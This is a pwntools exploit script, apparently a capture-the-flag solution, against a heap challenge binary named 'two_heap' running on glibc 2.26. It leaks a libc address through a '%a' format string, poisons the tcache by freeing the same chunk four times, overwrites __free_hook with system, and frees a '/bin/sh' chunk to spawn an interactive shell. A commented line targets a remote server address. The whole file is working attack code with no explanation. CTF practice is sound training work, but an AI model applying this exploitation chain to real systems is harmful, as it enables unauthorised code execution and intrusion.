from pwn import *
def name(n):
	p.sendafter(":\n",n)
def cmd(c):
	p.sendlineafter(":",str(c))
def add(size,n="\n"):
	cmd(1)
	cmd(size)
	p.sendafter(":\n",n)
def free(idx):
	cmd(2)
	cmd(idx)
#context.log_level='debug'
libc=ELF("./libc-2.26.so")
#libc=ELF("/glibc/x64/2.26/lib/libc-2.26.so")
p=process("./two_heap",env={"LD_PRELOAD":"./libc-2.26.so"})
#p=process('./two_heap',env={"LD_PRELOAD":"/glibc/x64/2.26/lib/libc-2.26.so"})
#p=remote("47.104.89.129",10002)
name("%a|%a%a%a%a")
p.readuntil("|0x0p+0")
p.read(4)
base=int("0x"+p.readuntil("p")[:-1],16)-(0x7ffff7ffea78-0x7ffff7a26000)-(0x7ffff2264fa-0x7ffff7dd7000)
log.warning(hex(base))

libc.address=base
cmd(1)
cmd(0)
for x in range(4):
	free(0)
add(0x8,p64(0x7ffff7ff15a8-0x7ffff7dd7000+base))
#add(0x8,p64(libc.sym['__free_hook']))
add(0x10)
gdb.attach(p)
add(0x18,p64(0x7ffff7e85f80-0x7ffff7dd7000+base)+'\n')
#add(0x18,p64(libc.sym['system'])+"\n")
add(0x28,"/bin/sh\x00\n")

free(4)
#gdb.attach(p,'b *0x000555555555604')

#
p.interactive()
